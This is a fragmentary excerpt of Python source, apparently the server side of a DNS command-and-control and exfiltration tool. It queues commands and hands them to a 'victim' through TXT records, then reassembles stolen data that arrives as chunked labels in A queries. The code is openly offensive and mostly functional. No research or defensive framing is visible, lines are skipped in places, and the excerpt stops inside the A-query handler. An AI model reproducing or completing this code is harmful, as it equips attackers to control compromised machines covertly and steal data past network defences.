124 def assemble_exfil(self, timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL) -> str:
125 """
126 Waits up to `timeout` seconds for all expected chunks to arrive,
127 polling `exfil_buffer` every `poll` seconds. Returns the assembled
128 text (or empty string on timeout).
129 """
130
131 # Start the timer
132 start = time.time()
133
134 while True:
135 # Check if we have received all expected chunks
136 if self.expected_chunks is not None and len(self.exfil_buffer) >= self.expected_chunks:
137 break
138
139 # If we time out, break the loop
140 if time.time() - start > timeout:
141 break
142
143 # Sleep for a short while before checking again
144 time.sleep(poll)
145
146 # If we have received all expected chunks, assemble the data
147 data = b""
148 if self.expected_chunks is not None and len(self.exfil_buffer) >= self.expected_chunks:
149 data = b''.join(self.exfil_buffer[i] for i in range(self.expected_chunks))
150 else:
151 print("[DNS SERVER] Timeout while waiting for all chunks. Returning empty data.")
152 self.expected_chunks = None
153 self.exfil_buffer.clear()
154 return None
155
156 # Reset buffers
157 self.expected_chunks = None
158 self.exfil_buffer.clear()
159

161 return data

168 def handle(self):
169 """
170 This nested class is used by the ThreadingUDPServer. On each DNS packet:
171 - If it's a TXT-query for "command.<cfg.DNS_DOMAIN>", pop the next command
172 from self.server.sender.command_queue, wrap it in a TXT RR, and send it back.
173 - If it's an A-query with label <seq>/<tot>-<chunk>.command.<cfg.DNS_DOMAIN>,
174 decode the chunk, store it in self.server.sender.exfil_buffer[seq], set
175 self.server.sender.expected_chunks = tot (if not already set), then reply
176 with A=127.0.0.1 so the victim's resolver completes normally.
177 """
178
179 # Get raw data with `data` and socket to respond with `sock`
180 data, sock = self.request
181
182 try:
183 # Try to parse the raw bytes from `data`
184 req = DNSRecord.parse(data)
185
186 # Try to get the queried domain name
187 qname = str(req.q.qname).rstrip('.')
188
189 # Try to get the query type (should be A or TXT here)
190 qtype = QTYPE[req.q.qtype]
191 except Exception as e:
192 print(f"[DNS SERVER] Error while parsing DNS request: {e}.")
193 return
194
195 # Create a DNS response with identical transaction ID
196 # and question section
197 reply = req.reply()
198
199 # Access the shared DNSSender instance
200 sender: "DNSSender" = self.server.sender
201
202 # Victim pulling commands via TXT queries
203 # If there are pending commands in cfg.command_queue,
204 # pops the first one and embeds it as the TXT record in the DNS answer.
205 if qtype == "TXT" and qname == f"command.{cfg.DNS_DOMAIN}":
206
207 # Check if there is an available command
208 cmd = ""
209 if sender.command_queue:
210 cmd = sender.command_queue.pop(0)
211 print(f"[DNS SERVER] TXT request received, trying to send command: {cmd!r}")
212
213 reply.add_answer(
214 RR(
215 qname, # The exact name the client asked for
216 QTYPE.TXT, # Record type "TXT"
217 rdata=TXT(cmd), # Wrap our `cmd` string into a dnslib.TXT object
218 ttl=0 # TTL=0 means "don't cache this record" (VERY IMPORTANT)
219 )
220 )
221
222 # Sends response
223 try: sock.sendto(reply.pack(), self.client_address)
224 except Exception as e:
225 print(f"[DNS SERVER] Failed to send TXT reply: {e}.")
226 return
227
228 # Victim exfiltrating via A-queries
229 if qtype == "A":

238 # the id of chunk / the total number of chunks (both in hex)
